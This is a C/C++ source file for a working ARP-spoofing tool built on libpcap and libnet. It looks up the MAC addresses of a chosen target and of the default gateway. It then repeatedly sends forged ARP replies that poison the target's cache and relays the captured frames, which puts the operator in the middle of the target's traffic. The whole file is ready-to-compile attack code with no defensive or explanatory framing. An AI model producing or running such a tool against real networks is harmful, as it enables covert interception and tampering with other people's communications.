/* compile option
g++ -o arp_spoofing arp_spoofing.cpp -lpcap -lnet */

#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <pcap/pcap.h>
#include <libnet.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <time.h>

unsigned char my_ip[4];
unsigned char my_mac[6];
unsigned char target_ip[4];
unsigned char target_mac[6];
unsigned char gateway_ip[4];
unsigned char gateway_mac[6];

bool flag = false;

void callback_target ( unsigned char *useless, const struct pcap_pkthdr *pkthdr, const unsigned char *pkt );
void callback_gateway ( unsigned char *useless, const struct pcap_pkthdr *pkthdr, const unsigned char *pkt );

int chk_strcmp ( const unsigned char *a, const unsigned char *b, int n )
{
	int i;
	for(i=0; i<n; i++){
		if ( a[i] != b[i] ) return 1;
	} return 0;
}

// get the target_mac
int arp_request ( pcap_t *pd )
{
	unsigned char req_pkt[50];
	int ether_size = 14;
	
	// ethernet
	int i;
	for(i=0; i<6; i++){
		req_pkt[0+i] = 0xff;
		req_pkt[6+i] = my_mac[i];
	} req_pkt[12] = 0x08, req_pkt[13] = 0x06;
	
	// arp
	req_pkt[ether_size+0] = 0x00, req_pkt[ether_size+1] = 0x01; // Hardware type
	req_pkt[ether_size+2] = 0x08, req_pkt[ether_size+3] = 0x00;	// Protocol type
	req_pkt[ether_size+4] = 0x06; // Hardware size
	req_pkt[ether_size+5] = 0x04; // Protocol size
	req_pkt[ether_size+6] = 0x00, req_pkt[ether_size+7] = 0x01; // Opcode
	for(i=0; i<6; i++){
		req_pkt[ether_size+8+i] = my_mac[i]; // Sender mac
	} for(i=0; i<4; i++){
		req_pkt[ether_size+14+i] = my_ip[i]; // Sender ip
	} for(i=0; i<6; i++){
		req_pkt[ether_size+18+i] = 0x00; // Target mac
	} for(i=0; i<4; i++){
		req_pkt[ether_size+24+i] = target_ip[i]; // Target ip
	}
	
	int res = pcap_sendpacket ( pd, req_pkt, 42 );
	if ( res != 0 ) return -1;

	res = pcap_loop ( pd, 5, callback_target, NULL );
	if ( res != 0 || !flag ) return -1;

	flag = false;
	// ethernet
	for(i=0; i<6; i++){
		req_pkt[0+i] = 0xff;
		req_pkt[6+i] = my_mac[i];
	} req_pkt[12] = 0x08, req_pkt[13] = 0x06;
	
	// arp
	req_pkt[ether_size+0] = 0x00, req_pkt[ether_size+1] = 0x01; // Hardware type
	req_pkt[ether_size+2] = 0x08, req_pkt[ether_size+3] = 0x00;	// Protocol type
	req_pkt[ether_size+4] = 0x06; // Hardware size
	req_pkt[ether_size+5] = 0x04; // Protocol size
	req_pkt[ether_size+6] = 0x00, req_pkt[ether_size+7] = 0x01; // Opcode
	for(i=0; i<6; i++){
		req_pkt[ether_size+8+i] = my_mac[i]; // Sender mac
	} for(i=0; i<4; i++){
		req_pkt[ether_size+14+i] = my_ip[i]; // Sender ip
	} for(i=0; i<6; i++){
		req_pkt[ether_size+18+i] = 0x00; // Gateway mac
	} for(i=0; i<4; i++){
		req_pkt[ether_size+24+i] = gateway_ip[i]; // Gateway ip
	}

	res = pcap_sendpacket ( pd, req_pkt, 42 );
	if ( res != 0 ) return -1;

	res = pcap_loop ( pd, 5, callback_gateway, NULL );
	if ( res != 0 || !flag ) return -1;
	
	return 0;
}

void callback_target ( unsigned char *useless, const struct pcap_pkthdr *pkthdr, const unsigned char *pkt )
{
	if ( flag ) return;

	struct ether_header *eh;
	unsigned short ether_type;
	
	struct libnet_arp_hdr *ah;
	
	eh = (struct ether_header *) pkt;
	pkt += sizeof ( struct ether_header );
	
	ether_type = ntohs ( eh->ether_type );
	
	if ( ether_type == 0x0806 ){
		ah = (struct libnet_arp_hdr *) pkt;
		
		if ( ntohs(ah->ar_op) == 0x02 ){
			pkt += sizeof ( struct libnet_arp_hdr );
		
			if ( chk_strcmp ( target_ip, pkt+6, 4 ) == 0 ){
				memcpy ( target_mac, pkt, 6 );
				
				/* check target_mac */
				printf("target_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
				
				flag = true;
			}
		}
	}
	
	return;
}

void callback_gateway ( unsigned char *useless, const struct pcap_pkthdr *pkthdr, const unsigned char *pkt )
{
	if ( flag ) return;

	struct ether_header *eh;
	unsigned short ether_type;
	
	struct libnet_arp_hdr *ah;
	
	eh = (struct ether_header *) pkt;
	pkt += sizeof ( struct ether_header );
	
	ether_type = ntohs ( eh->ether_type );
	
	if ( ether_type == 0x0806 ){
		ah = (struct libnet_arp_hdr *) pkt;
		
		if ( ntohs(ah->ar_op) == 0x02 ){
			pkt += sizeof ( struct libnet_arp_hdr );
		
			if ( chk_strcmp ( gateway_ip, pkt+6, 4 ) == 0 ){
				memcpy ( gateway_mac, pkt, 6 );
				
				/* check target_mac */
				printf("gateway_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", gateway_mac[0], gateway_mac[1], gateway_mac[2], gateway_mac[3], gateway_mac[4], gateway_mac[5]);
				
				flag = true;
			}
		}
	}
	
	return;
}

int send_arp_reply ( pcap_t *pd )
{
	unsigned char req_pkt[50];
	int ether_size = 14;
	
	// ethernet
	int i;
	for(i=0; i<6; i++){
		req_pkt[0+i] = target_mac[i];
		req_pkt[6+i] = my_mac[i];
	} req_pkt[12] = 0x08, req_pkt[13] = 0x06;
	
	// arp
	req_pkt[ether_size+0] = 0x00, req_pkt[ether_size+1] = 0x01; // Hardware type
	req_pkt[ether_size+2] = 0x08, req_pkt[ether_size+3] = 0x00;	// Protocol type
	req_pkt[ether_size+4] = 0x06; // Hardware size
	req_pkt[ether_size+5] = 0x04; // Protocol size
	req_pkt[ether_size+6] = 0x00, req_pkt[ether_size+7] = 0x02; // Opcode
	for(i=0; i<6; i++){
		req_pkt[ether_size+8+i] = my_mac[i]; // Sender mac
	} for(i=0; i<4; i++){
		req_pkt[ether_size+14+i] = gateway_ip[i]; // Sender ip
	} for(i=0; i<6; i++){
		req_pkt[ether_size+18+i] = target_mac[i]; // Target mac
	} for(i=0; i<4; i++){
		req_pkt[ether_size+24+i] = target_ip[i]; // Target ip
	}
	
	int res = pcap_sendpacket ( pd, req_pkt, 42 );
	if ( res != 0 ) return -1;

//	printf("\narp attack successful\n");
	return 0;
}

int arp_spoofing ( pcap_t *pd )
{
	int res;
	double s, t;

	struct pcap_pkthdr *hdr;
	const u_char *pkt;
	unsigned char spf_pkt[10000];

	unsigned char pktsrc_mac[6];

	s = clock ();
	res = send_arp_reply ( pd );
	if ( res < 0 ){
		printf("\nerror: arp_reply attack failed\n");
	}

	for(;;){
		t = clock ();
		//printf("time : %lf\n", (t-s)/CLOCKS_PER_SEC);
		if ( (t-s)/CLOCKS_PER_SEC > 0.1 ){
			res = send_arp_reply ( pd );
			if ( res < 0 ){
				printf("\nerror: arp reply\n");
				return -1;
			}
			s = clock ();
		}

		res = pcap_next_ex ( pd, &hdr, &pkt );
		if ( res == 0 && hdr->len > 0 ){
			for(int i=0; i<6; i++) pktsrc_mac[i] = pkt[i];
			printf("before\n");
			printf("pktdst_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", pktsrc_mac[0], pktsrc_mac[1], pktsrc_mac[2], pktsrc_mac[3], pktsrc_mac[4], pktsrc_mac[5]);
			for(int i=0; i<6; i++) pktsrc_mac[i] = pkt[i+6];
			printf("pktsrc_mac : %02x:%02x:%02x:%02x:%02x:%02x\n\n", pktsrc_mac[0], pktsrc_mac[1], pktsrc_mac[2], pktsrc_mac[3], pktsrc_mac[4], pktsrc_mac[5]);
			
			for(int i=0; i<6; i++) pktsrc_mac[i] = pkt[i];
			if ( chk_strcmp ( my_mac, pktsrc_mac, 6 ) == 0 ){
				memcpy ( spf_pkt, pkt, hdr->len );
				memcpy ( spf_pkt, gateway_mac, 6 );
				memcpy ( spf_pkt+6, my_mac, 6 );
	
				memcpy ( pktsrc_mac, spf_pkt, 6 );
				printf("after\n");
				printf("pktdst_mac : %02x:%02x:%02x:%02x:%02x:%02x\n", pktsrc_mac[0], pktsrc_mac[1], pktsrc_mac[2], pktsrc_mac[3], pktsrc_mac[4], pktsrc_mac[5]);
				memcpy ( pktsrc_mac, spf_pkt+6, 6 );
				printf("pktsrc_mac : %02x:%02x:%02x:%02x:%02x:%02x\n\n", pktsrc_mac[0], pktsrc_mac[1], pktsrc_mac[2], pktsrc_mac[3], pktsrc_mac[4], pktsrc_mac[5]);
	

				if ( pcap_sendpacket ( pd, spf_pkt, hdr->len ) == 0 ){
					printf("\nsuccessfully relay\n");
				}
			}
		}
	}
}

int main ( int argc, char **argv )
{
	char *dev, *net, *mask;
	char errbuf[256], tmpbuf[256];
	
	int ret;
	bpf_u_int32 netp, maskp;
	
	pcap_t *pd;
	
	libnet_t *ld;
	u_int32_t tmp_ip;
	struct libnet_ether_addr *tmp_mac;
	
	/* usage
	arp_spoofing [network device] [target ip] */
	if ( argc != 3 ){
		printf("usage : arp_send [network device] [target ip]\n");
		return 1;
	}
	
	// dev = pcap_lookupdev ( errbuf );
	dev = argv[1];
	if ( dev == NULL ){
		printf("%s\n", errbuf);
		return 1;
	}
	
	ret = pcap_lookupnet ( dev, &netp, &maskp, errbuf );
	if ( ret == -1 ){
		printf("%s\n", errbuf);
		return 1;
	}
	
	pd = pcap_open_live ( dev, BUFSIZ, 0, -1, errbuf );
	if ( pd == NULL ){
		printf("%s\n", errbuf);
		return 1;
	}
	
	ld = libnet_init ( LIBNET_LINK_ADV, dev, errbuf );
	tmp_ip = libnet_get_ipaddr4 ( ld );
	memcpy ( my_ip, (unsigned char *)&tmp_ip, 4 );

	tmp_mac = libnet_get_hwaddr ( ld );
	memcpy ( my_mac, (unsigned char *)tmp_mac, 6 );
	
	int i, j;
	for(i=0, j=0; argv[2][i]!=0; i++){
		if ( argv[2][i] == '.' ) j ++;
		else {
			target_ip[j] = target_ip[j]*10 + (argv[2][i]-'0');
		}
	}

	FILE *fp = NULL;
	fp = popen("route | awk '/^default/{print $2}'", "r");
	if ( fp == NULL ){
		printf("\nerror: gateway system call\n");
		return 1;
	} fscanf(fp, "%s", tmpbuf);

	for(i=0, j=0; tmpbuf[i]!=0; i++){
		if ( tmpbuf[i] == '.' ) j ++;
		else {
			gateway_ip[j] = gateway_ip[j]*10 + (tmpbuf[i]-'0');
		}
	}

	/* check my_ip and my_mac */
	printf("my_ip      : %d.%d.%d.%d\n", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
	printf("my_mac     : %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
	printf("gateway_ip : %d.%d.%d.%d\n", gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
	printf("target_ip  : %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
	
	int res;
	res = arp_request ( pd );
	if ( res != 0 ){
		printf("\nerror: arp_request\n");
		return 1;
	}
	
	//res = send_arp_reply ( pd );
	res = arp_spoofing ( pd );
	if ( res != 0 ){
		printf("\nerror: arp_spoofing\n");
		return 1;
	}

	printf("\nSuccessful\n");
	
	return 0;
}